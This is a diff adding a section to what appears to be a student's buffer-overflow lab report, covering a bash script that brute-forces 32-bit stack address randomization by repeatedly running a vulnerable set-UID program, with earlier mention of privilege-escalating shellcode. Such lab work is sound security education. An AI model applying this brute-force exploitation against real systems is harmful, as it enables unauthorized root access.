@@ -392,3 +392,32 @@ After running the modified set-UID program with the updated shellcode, we succes
 To escalate privileges, the shellcode is modified to include additional instructions that escalate the process's privileges `before` spawning the shell.
 
 ## Exercise 8: Defeating Address Randomization
+
+On 32-bit Linux machines, stacks only have 19 bits of entropy, which means the stack base address can have 2^19 = 524, 288 possibilities. This number is not that high and can be exhausted easily with the brute-force approach. In this task, we use such an approach to defeat the address randomization countermeasure on our 32-bit VM. First, we turn on the Ubuntu’s address randomization using the following command:
+
+```bash
+sudo /sbin/sysctl -w kernel.randomize_va_space=2
+```
+![attacks](/Lab7/exercise8/img/1.png)
+
+Now, we just need to execute `/Lab7/exercise8/brute-force.sh`:
+
+```bash
+#!/bin/bash
+
+SECONDS=0
+value=0
+
+while true; do
+  value=$(( $value + 1 ))
+  duration=$SECONDS
+  min=$(($duration / 60))
+  sec=$(($duration % 60))
+  echo "$min minutes and $sec seconds elapsed."
+  echo "The program has been running $value times so far."
+  ./stack-L1
+done
+```
+We defeat this measure easily on  32-bit:
+
+![attacks](/Lab7/exercise8/img/2.png)
